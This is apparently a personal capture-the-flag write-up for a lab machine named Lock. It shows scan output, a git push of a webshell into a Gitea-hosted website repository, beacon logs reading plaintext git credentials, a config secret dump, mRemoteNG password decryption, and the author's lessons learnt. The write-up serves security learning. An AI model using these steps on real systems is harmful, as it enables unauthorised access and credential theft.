
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0  
| http-methods:                                                                                                                                                                                                    
|_  Potentially risky methods: TRACE                                                                     
|_http-title: Lock - Index                                                                               
445/tcp  open  microsoft-ds?                                                                             
3000/tcp open  http          Golang net/http server                                                      
|_http-title: Gitea: Git with a cup of tea                                                               
| fingerprint-strings:                                                                                   
|   GenericLines, Help, RTSPRequest:                                                                     
|     HTTP/1.1 400 Bad Request                                                                           
|     Content-Type: text/plain; charset=utf-8                                                            
|     Connection: close                                                                                  
|     Request                                                                                            
|   GetRequest:                                                                                          
|     HTTP/1.0 200 OK                                                                                    
|     Cache-Control: max-age=0, private, must-revalidate, no-transform    
|     Content-Type: text/html; charset=utf-8                                                             
|     Set-Cookie: i_like_gitea=0e87820f13156b05; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=n-buleE0m8-droCMNVwYqcEkTuU6MTc1NjExNjc1MjUwMzA4NjYwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN                                                                        
|     Date: Mon, 25 Aug 2025 10:12:32 GMT                                                                
|     <!DOCTYPE html>                                                                                    
|     <html lang="en-US" class="theme-auto">                                                             
|     <head>                                                                                             
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>                                                        
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zd
DozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions:                                                                                         
|     HTTP/1.0 405 Method Not Allowed                                                                    
|     Allow: HEAD                                                                                        
|     Allow: HEAD                                                                                        
|     Allow: GET          
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=592d67aa863515f1; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=-ksbODP9PuLfQE_BxLFQlUcPEN86MTc1NjExNjc1MzcxNzU4NjMwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 25 Aug 2025 10:12:33 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2025-04-15T00:34:47       
|_Not valid after:  2025-10-15T00:34:47
|_ssl-date: 2025-08-25T10:13:35+00:00; 0s from scanner time.                                  
| rdp-ntlm-info:                                                                                         
|   Target_Name: LOCK

```


i was abit lost and scared so i looked at the hint and focused on it, What I did was that I trusted self 2 to do what needs to be done and I had clicked on every single thing on the website to find there were 2 commits, after that I checked them to find the access token ``



I thought I would need to change something in dev-scripts when in reality I needed to change the other repo i didnt enumerate




```
    "name": "website",
    "full_name": "ellen.freeman/website",
    "description": "",
    "empty": false,
    "private": true,
    "fork": false,
    "template": false,
    "parent": null,
    "mirror": false,
    "size": 7370,
    "language": "CSS",
    "languages_url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/languages",
    "html_url": "http://localhost:3000/ellen.freeman/website",
    "url": "http://localhost:3000/api/v1/repos/ellen.freeman/website",
    "link": "",
    "ssh_url": "ellen.freeman@localhost:ellen.freeman/website.git",
    "clone_url": "http://localhost:3000/ellen.freeman/website.git",
    "original_url": "",
    "website": "",
    "stars_count": 0,
    "forks_count": 0,
    "watchers_count": 1,
    "open_issues_count": 0,
    "open_pr_counter": 0,
    "release_counter": 0,
    "default_branch": "main",
    "archived": false,
    "created_at": "2023-12-27T12:04:52-08:00",
    "updated_at": "2024-01-18T10:17:46-08:00",
    "archived_at": "1969-12-31T16:00:00-08:00",
    "permissions": {
      "admin": true,
      "push": true,
      "pull": true

```




since now I have full access to the repository that means I should be able to simply upload a webshell to get a reverse shell back. DUHHHH.





```python
kali@kali ~/b/v/l/website (main)> git add shell.php 
kali@kali ~/b/v/l/website (main)> git commit -m "Test commit with shell"
Author identity unknown

*** Please tell me who you are.

Run

  git config --global user.email "you@example.com"
  git config --global user.name "Your Name"

to set your account's default identity.
Omit --global to set the identity only in this repository.

kali@kali ~/b/v/l/website (main)> git config user.email "ellen.freeman@lock.vl"
kali@kali ~/b/v/l/website (main)> git config user.name "ellis"
kali@kali ~/b/v/l/website (main)> git commit -m "Test commit with shell"
[main 9a5f8af] Test commit with shell
 1 file changed, 17 insertions(+)
 create mode 100644 shell.php
kali@kali ~/b/v/l/website (main)> git push origin main
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 494 bytes | 494.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.129.234.64:3000/ellen.freeman/website.git
   73cdcc1..9a5f8af  main -> main


```



here i make sure to log in then itll prompt me for the token

```

```









```
c:\Gitea\custom\conf>cat app.ini                                                                                                                                                                                   
cat app.ini                       
'cat' is not recognized as an internal or external command,                                              
operable program or batch file.                     
                                                    
c:\Gitea\custom\conf>type app.ini
type app.ini                
APP_NAME = Gitea: Git with a cup of tea             
RUN_USER = ellen.freeman
WORK_PATH = C:\Gitea
RUN_MODE = prod                                     
                                                    
[database]     
DB_TYPE = sqlite3                                   
HOST = 127.0.0.1:5432
NAME = gitea  
USER = gitea
PASSWD =                
SCHEMA =                                            
SSL_MODE = disable       
PATH = C:\Gitea\data\gitea.db
LOG_SQL = false                                     
                                                    
[repository]                   
ROOT = C:/Gitea/data/gitea-repositories             
                                                    
[server]           
SSH_DOMAIN = localhost                                                                                                                                                                                             
DOMAIN = localhost         
HTTP_PORT = 3000                                    
ROOT_URL = http://localhost:3000/
APP_DATA_PATH = C:\Gitea/data                                                                            
DISABLE_SSH = true                                  
LFS_START_SERVER = true
LFS_JWT_SECRET = 4iSCsD_-sqkPUhm2oirUw9pfwFJPdSp5XDoCEwt0rDM                                             
OFFLINE_MODE = false                                
                                                    
[lfs]
PATH = C:/Gitea/data/lfs

[mailer]
ENABLED = false

[service]
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
DISABLE_REGISTRATION = true
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
REQUIRE_SIGNIN_VIEW = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true

```




```
+--- Task [0ac3f2ba] closed ----------------------------------------------------------+

[26/08 09:23:43] kali [d7d6655a] beacon > cat .git-credentials
[26/08 09:23:43] [*] Task: read file
[26/08 09:23:44] [*] Agent called server, sent [33 bytes]
[26/08 09:23:44] [+] '.git-credentials' file content:
http://ellen.freeman:YWFrWJk9uButLeqx@localhost:3000

+--- Task [d7d6655a] closed ----------------------------------------------------------+

[26/08 09:23:50] kali [722bdf87] beacon > cat .gitconfig
[26/08 09:23:50] [*] Task: read file
[26/08 09:23:52] [*] Agent called server, sent [27 bytes]
[26/08 09:23:52] [+] '.gitconfig' file content:
[user]
	email = ellen.freeman@oplock.vl
	name = Ellen Freeman
[safe]
	directory = C:/inetpub/wwwroot
[credential "http://localhost:3000"]
	provider = generic

+--- Task [722bdf87] closed ----------------------------------------------------------+

```






```xml
[26/08 09:36:00] kali [9256e47a] beacon > cat confCons.xml
[26/08 09:36:00] [*] Task: read file
[26/08 09:36:00] [*] Agent called server, sent [29 bytes]
[26/08 09:36:00] [+] 'confCons.xml' file content:
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="u5ojv17tIZ1H1ND1W0YqvCslhrNSkAV6HW3l/hTV3X9pN8aLxxSUoc2THyWhrCk18xWnWi+DtnNR5rhTLz59BBxo" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qCeyyO1vVrOCRxJ/LXe6TmDmr6ZTbNr3Br5oMtLCclw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false"

```



```
kali@kali ~/b/v/l/mRemoteNG_password_decrypt (master)> python mremoteng_decrypt.py ../confCons.xml 
Name: RDP/Gale
Hostname: Lock
Username: Gale.Dekarios
Password: ty8wnW9qCKDosXo6
```





























# Good things done

- Trusted self one at the start
- tried my hardest to find the access token and I did


# Learnt

- desktop tells alot, see whats shown and the rest is obvious

# Mistakes
- didnt see what the repo script actually does
	- i need to look at it, slow is smooth, smooth is fast
- didnt enumerate other repositories
	- thats okay, something new learnt,
- was too impatient, why did i click on the hint when I  just saw in the fucking `_install` folder mremoteNG and other things present, these are custom programs which means there could be credentials
- google wouldve helped to realise that the remoteng password is fucking encrypted, didnt google just threw the password in and if i read the XML file id figure that 
- didnt read the PoC blog properly when doing the exploit, a solid randal moment i used edge when it was said to NOT use EDGE


https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/